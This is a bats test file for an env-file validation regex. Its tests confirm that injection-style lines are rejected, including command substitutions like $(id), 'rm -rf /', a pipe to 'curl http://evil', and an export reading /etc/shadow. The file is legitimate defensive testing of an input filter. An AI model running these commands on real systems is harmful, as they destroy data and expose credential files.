#!/usr/bin/env bats
# ENV_PAT: the env-file grammar. run.sh's keep/drop block stays inline in
# rootfs/run.sh (it is two greps around this constant); these tests pin the
# exact same usage (grep -E keep / grep -vE reject / blank+#-comment skip)
# against the sourced ENV_PAT so the grammar cannot drift unnoticed.

load 'test_helper'
setup() { setup_tmp; }
teardown() { teardown_tmp; }

# Mirror of run.sh's env filtering (lines around the ENV_PAT use site):
# kept lines -> stdout; rejected, non-trivial lines -> $BAD.
envpat_filter() {
  local raw="$TMP/raw"
  printf '%s\n' "$1" > "$raw"
  grep -E "$ENV_PAT" "$raw" > "$TMP/kept" || true
  BAD="$(grep -vE "$ENV_PAT" "$raw" || true)"
  BAD="$(printf '%s\n' "$BAD" | grep -vE '^[[:space:]]*(#.*)?$' || true)"
}

@test "ENV_PAT keeps plain KEY=VALUE, export-prefix, quoted and empty values" {
  envpat_filter 'OLLAMA_API_KEY=abc123
export TERM=xterm-256color
MODEL="glm-5.3"
EMPTY=
KEY=v # trailing comment'
  [[ "$(cat "$TMP/kept")" == "$(printf 'OLLAMA_API_KEY=abc123\nexport TERM=xterm-256color\nMODEL="glm-5.3"\nEMPTY=\nKEY=v # trailing comment')" ]]
  [ -z "$BAD" ]
}

@test "ENV_PAT is value-grammar-lax but comment-strict: only '#'-after-space starts a comment" {
  envpat_filter 'KEY=v#$(id)'   # inline comment token: bash would EXECUTE $(id)
  ! grep -qF 'KEY=v#$(id)' "$TMP/kept"
  [[ "$BAD" == 'KEY=v#$(id)' ]]
}

@test "ENV_PAT rejects an unbalanced trailing quote (would abort '.' sourcing)" {
  envpat_filter 'KEY="unbalanced'
  [ -s "$TMP/kept" ] && { cat "$TMP/kept" >&2; fail 'unbalanced quote kept'; }
  [[ "$BAD" == 'KEY="unbalanced' ]]
}

@test "ENV_PAT rejects code lines and command substitutions" {
  envpat_filter 'KEY="$(id)"
rm -rf /
X=|curl http://evil|
export A=$(cat /etc/shadow)'
  [ ! -s "$TMP/kept" ]
  BADLINES="$(printf '%s\n' "$BAD" | sort)"
  [[ "$BADLINES" == "$(printf 'KEY="$(id)"\nX=|curl http://evil|\nexport A=$(cat /etc/shadow)\nrm -rf /' | sort)" ]]
}

@test "ENV_PAT keeps leading-whitespace-indented assignments" {
  envpat_filter '  KEY=v'
  [[ "$(cat "$TMP/kept")" == '  KEY=v' ]]
}

@test "ENV_PAT: blank and #-comment lines land in the reject stream but are silenced by run.sh's mask" {
  envpat_filter '# a comment

KEY=v'
  [[ "$(cat "$TMP/kept")" == 'KEY=v' ]]
  [ -z "$BAD" ]
}